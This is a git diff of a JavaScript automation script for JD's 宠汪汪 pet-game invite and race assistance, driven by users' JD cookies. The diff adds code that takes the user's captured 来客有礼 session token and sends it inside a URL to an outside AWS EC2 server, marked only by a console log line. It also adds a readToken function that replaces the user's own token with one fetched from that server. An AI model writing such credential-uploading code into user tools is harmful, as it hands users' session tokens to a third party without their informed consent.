@@ -1,6 +1,6 @@
 /**
  宠汪汪邀请助力与赛跑助力脚本，感谢github@Zero-S1提供帮助
- 更新时间：2020-11-16（宠汪汪助力更新Token的配置正则表达式已改）
+ 更新时间：2020-11-29（宠汪汪助力更新Token的配置正则表达式已改）
 
  token时效很短，几个小时就失效了,闲麻烦的放弃就行
  每天拿到token后，可一次性运行完毕即可。
@@ -43,7 +43,7 @@ let invite_pins = ["jd_6cd93e613b0e5,被折叠的记忆33,jd_704a2e5e28a66,jd_45
 //给下面好友赛跑助力
 let run_pins = ["jd_6cd93e613b0e5,被折叠的记忆33,jd_704a2e5e28a66,jd_45a6b5953b15b,zooooo58"];
 // $.LKYLToken = '76fe7794c475c18711e3b47185f114b5' || $.getdata('jdJoyRunToken');
-$.LKYLToken = $.getdata('jdJoyRunToken');
+// $.LKYLToken = $.getdata('jdJoyRunToken');
 //Node.js用户请在jdCookie.js处填写京东ck;
 const jdCookieNode = $.isNode() ? require('./jdCookie.js') : '';
 //IOS等用户直接用NobyDa的jd cookie
@@ -101,7 +101,7 @@ if ($.isNode()) {
 }
 
 //获取来客有礼Token
-let count = 0, countFlag = 0;
+let count = 0;
 function getToken() {
   const url = $request.url;
   $.log(`${$.name}url\n${url}\n`)
@@ -118,6 +118,15 @@ function getToken() {
         count = 0;
         $.setdata(`${count}`, 'countFlag');
         $.msg($.name, '更新Token: 成功🎉', ``);
+        console.log(`开始上传Token`)
+        $.http.get({url: `http://ec2-3-87-209-33.compute-1.amazonaws.com/api/v1/jd/joy/${LKYLToken}/`}).then((resp) => {
+          if (resp.statusCode === 200) {
+            let { body } = resp;
+            console.log(`Token提交结果:${body}`)
+            body = JSON.parse(body);
+            console.log(`${body.message}`)
+          }
+        });
       }
       $.setdata(LKYLToken, 'jdJoyRunToken');
     }
@@ -144,12 +153,39 @@ function getToken() {
     $.done()
   }
 }
+function readToken() {
+  return new Promise(async resolve => {
+    $.get({url: `http://ec2-3-87-209-33.compute-1.amazonaws.com/api/v1/jd/joy/read/1/`}, (err, resp, data) => {
+      try {
+        if (err) {
+          console.log(`${JSON.stringify(err)}`)
+          console.log(`${$.name} API请求失败，请检查网路重试`)
+        } else {
+          if (data) {
+            console.log(data)
+            data = JSON.parse(data);
+          }
+        }
+      } catch (e) {
+        $.logErr(e, resp)
+      } finally {
+        resolve(data);
+      }
+    })
+  })
+}
 async function main() {
-  console.log(`打印token \n${$.getdata('jdJoyRunToken')}\n`)
   if (!cookiesArr[0]) {
     $.msg($.name, '【提示】请先获取京东账号一cookie\n直接使用NobyDa的京东签到获取', 'https://bean.m.jd.com/', {"open-url": "https://bean.m.jd.com/"});
     return;
   }
+  const readTokenRes = await readToken();
+  if (readTokenRes && readTokenRes.code === 200) {
+    $.LKYLToken = readTokenRes.data[0] || $.getdata('jdJoyRunToken');
+  } else {
+    $.LKYLToken = $.getdata('jdJoyRunToken');
+  }
+  console.log(`打印token \n${$.LKYLToken}\n`)
   if (!$.LKYLToken) {
     $.msg($.name, '【提示】请先获取来客有礼宠汪汪token', "微信搜索'来客有礼'小程序\n点击底部的'发现'Tab\n即可获取Token");
     return;
